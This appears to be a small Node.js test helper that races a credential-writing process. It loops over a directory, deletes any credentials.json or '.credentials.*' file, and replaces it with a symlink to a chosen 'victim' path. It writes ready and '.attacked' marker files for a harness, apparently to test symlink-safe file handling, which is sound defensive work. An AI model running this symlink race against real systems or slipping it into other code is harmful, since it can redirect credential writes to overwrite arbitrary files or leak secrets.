const fs = require("node:fs")
const [dir, victim, ready] = process.argv.slice(2)
fs.writeFileSync(ready, "ready")
for (;;) {
  try {
    for (const name of fs.readdirSync(dir)) {
      if (name !== "credentials.json" && !name.startsWith(".credentials.")) continue
      const target = `${dir}/${name}`
      try { fs.unlinkSync(target) } catch {}
      try { fs.symlinkSync(victim, target); fs.writeFileSync(`${ready}.attacked`, "yes") } catch {}
    }
  } catch {}
}
